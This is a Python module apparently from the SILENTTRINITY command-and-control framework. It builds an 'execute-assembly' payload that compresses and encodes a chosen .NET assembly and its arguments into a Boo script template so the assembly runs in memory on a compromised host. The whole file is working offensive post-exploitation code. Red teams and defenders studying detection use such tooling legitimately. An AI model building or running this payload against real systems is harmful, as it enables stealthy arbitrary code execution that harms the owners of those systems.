from silenttrinity.core.utils import get_path_in_package
import os
from shlex import split
from silenttrinity.core.teamserver.module import Module
from silenttrinity.core.teamserver.utils import dotnet_deflate_and_encode


class STModule(Module):
    def __init__(self):
        self.name = 'boo/execute-assembly'
        self.language = 'boo'
        self.description = 'Execute a .NET assembly in memory'
        self.author = '@byt3bl33d3r'
        self.references = []
        self.options = {
            'Assembly': {
                'Description'   :   'Path to assembly',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Arguments': {
                'Description'   :   'Arguments to pass to the assembly on runtime',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

    def payload(self):
        with open(get_path_in_package('core/teamserver/modules/boo/src/execute-assembly.boo')) as module:
            module = module.read()
            assembly_path = os.path.expanduser(self.options['Assembly']['Value'])
            if not os.path.exists(assembly_path):
                raise Exception("Assembly not found in specified path")

            assembly_size = os.path.getsize(assembly_path)
            with open(assembly_path, 'rb') as assembly:
                module = module.replace("B64_ENCODED_COMPRESSED_ASSEMBLY", dotnet_deflate_and_encode(assembly.read()))
                module = module.replace("DECOMPRESSED_ASSEMBLY_LENGTH", str(assembly_size))

                boolang_string_array = ''
                if self.options['Arguments']['Value']:
                    formatted_arguments = r', '.join([fr"`{arg}`" for arg in split(self.options['Arguments']['Value'])])
                    boolang_string_array = f"= array(string, ({formatted_arguments}))"

                module = module.replace("ASSEMBLY_ARGS", boolang_string_array)
                print(module)
                return module
